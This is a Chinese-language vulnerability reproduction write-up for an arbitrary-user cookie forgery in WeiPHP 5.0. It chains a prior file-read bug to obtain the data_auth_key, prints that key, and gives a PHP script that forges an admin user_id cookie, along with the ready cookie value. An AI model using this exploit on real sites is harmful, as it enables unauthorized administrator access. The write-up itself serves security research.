# WeiPHP5.0 任意用户Cookie伪造

本文仅用于技术讨论与研究，文中的实现方法切勿应用在任何违法场景。如因涉嫌违法造成的一切不良影响，本文作者概不负责。

## 漏洞简介

`WeiPHP5.0`是在2019年停止更新的一个系统，漏洞挺多的，跟着复现分析一下，这里复现一下 `WeiPHP5.0`的任意用户 `Cookie`伪造漏洞

## 影响范围

`WeiPHP5.0`最新版

可以据此下载

https://www.weiphp.cn/doc/download_source_installation.html

## 漏洞复现

首先要利用前些天发布的 [WeiPHP5.0 前台任意文件读取](https://mp.weixin.qq.com/s?__biz=Mzg2Mzc2OTM0OQ==&mid=2247483782&idx=1&sn=cf245173b17817006375afb705167985&chksm=ce72c7ecf9054efa2495d2ad1ee2bd7be66bd2b638c84dc10cf971df7048717e239dd4e12c19&token=646394225&lang=zh_CN#rd) 读取 `data_auth_key`

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1652363316312-37768b1d-d740-4f49-9ad7-5df887591a52.png)

访问 `/index.php/home/file/user_pics`后下载该文件

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1652363372337-4f582642-dba2-4286-b9fe-ae8d091dde9e.png)

找到 `data_auth_key`的值为

```php
'data_auth_key' => 'kE^&%X.IpoDq2US*n!u>@G8+#Rd{_]a<QfJ3Lg9?'
```

接下来利用 `think_encrypt`伪造 `cookie`，稍微改造一下即可

```php
<?php
highlight_file(__FILE__);
function think_encrypt($data, $key = '', $expire = 0)
{
    $key = md5("kE^&%X.IpoDq2US*n!u>@G8+#Rd{_]a<QfJ3Lg9?");

    $data = base64_encode($data);
    $x = 0;
    $len = strlen($data);
    $l = strlen($key);
    $char = '';

    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }

        $char .= substr($key, $x, 1);
        $x++;
    }

    $str = sprintf('%010d', $expire ? $expire + time() : 0);

    for ($i = 0; $i < $len; $i++) {
        $str .= chr(ord(substr($data, $i, 1)) + (ord(substr($char, $i, 1))) % 256);
    }
    return str_replace(array(
        '+',
        '/',
        '='
    ), array(
        '-',
        '_',
        ''
    ), base64_encode($str));
}

echo think_encrypt(1);

?>
```

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1652363741220-9965dd38-56aa-4788-9448-e6a54d77d372.png)

因此可以构造

```php
user_id=MDAwMDAwMDAwMIC1cp4
```

利用 `hackerbar`即可登录 `admin`

![img](https://cdn.nlark.com/yuque/0/2022/png/22586461/1652363859301-b4f78d46-2c90-4fcf-8420-b44af42f34d9.png)

## 总结

这个漏洞利用的前提是获得 `data_auth_key`，本文中是结合了前台任意文件读取漏洞获取，总体来说，如果该前台任意文件读取漏洞被补掉之后，这个洞就几乎无用武之地了。

## 参考链接

- `http://wiki.peiqi.tech/wiki/cms/WeiPHP/WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.html#weiphp5-0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7cookie%E4%BC%AA%E9%80%A0-cnvd-2021-09693`



`github` 链接：`https://github.com/N0puple/vulPOC`

想要获取更多资讯，或者获取文中环境可以关注公众号 “安全漏洞复现”，回复 “漏洞环境”
